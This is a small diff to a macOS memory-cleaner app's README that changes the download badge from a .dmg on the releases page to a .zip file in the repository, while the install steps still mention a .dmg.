@@ -21,7 +21,7 @@ Minimalist macOS memory cleaner that kills background processes and frees RAM �
 
 ## 📥 Installation
 
-[![Download AutoCleaner](https://img.shields.io/badge/⬇️%20Download-AutoCleanerByGerasim.dmg-blue)](https://github.com/Yogerasim/AutoCleanerByGerasim/releases/latest)
+[![Download AutoCleaner](https://img.shields.io/badge/⬇️%20Download-AutoCleanerByGerasim.zip-blue)](Releases/AutoCleanerByGerasim.zip)
 
 1. Download and open `.dmg`
 2. Drag the app into **Applications**
